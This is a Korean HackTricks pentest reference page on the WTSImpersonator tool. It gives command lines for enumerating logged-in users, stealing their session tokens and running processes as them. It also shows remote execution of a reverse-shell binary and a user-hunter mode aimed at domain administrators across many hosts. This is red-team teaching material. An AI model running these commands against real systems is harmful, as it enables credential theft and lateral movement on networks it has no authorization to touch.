<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **Hacking 트릭을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **깃허브 저장소에 제출하세요.**

</details>

**WTS Impersonator** 도구는 **"\\pipe\LSM_API_service"** RPC Named 파이프를 이용하여 로그인한 사용자를 은밀하게 열거하고 토큰을 탈취하여 전통적인 토큰 위장 기술을 우회합니다. 이 접근 방식은 네트워크 내에서 원활한 측면 이동을 용이하게 합니다. 이 기술의 혁신은 **Omri Baso**에게 귀속되며, 해당 작업은 [GitHub](https://github.com/OmriBaso/WTSImpersonator)에서 확인할 수 있습니다.

### 핵심 기능
이 도구는 API 호출의 일련의 시퀀스를 통해 작동합니다:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### 주요 모듈 및 사용법
- **사용자 열거**: 도구를 사용하여 로컬 및 원격 사용자 열거가 가능하며, 각 시나리오에 대한 명령을 사용합니다:
- 로컬에서:
```powershell
.\WTSImpersonator.exe -m enum
```
- IP 주소 또는 호스트 이름을 지정하여 원격으로 실행:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **명령 실행**: `exec` 및 `exec-remote` 모듈은 **서비스** 컨텍스트가 필요합니다. 로컬 실행은 WTSImpersonator 실행 파일과 명령만 필요합니다:
- 로컬 명령 실행 예시:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- 서비스 컨텍스트를 얻기 위해 PsExec64.exe를 사용할 수 있습니다:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **원격 명령 실행**: PsExec.exe와 유사하게 원격으로 서비스를 생성하고 설치하여 적절한 권한으로 실행하는 것을 의미합니다.
- 원격 실행 예시:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **사용자 수색 모듈**: 여러 시스템에서 특정 사용자를 대상으로 하여 해당 사용자의 자격 증명으로 코드를 실행합니다. 이는 여러 시스템에서 로컬 관리자 권한을 가진 도메인 관리자를 대상으로 하는 데 특히 유용합니다.
- 사용 예시:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* HackTricks에서 **회사 광고를 보거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 상품**](https://peass.creator-spring.com)을 구매하세요.
* 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family)인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
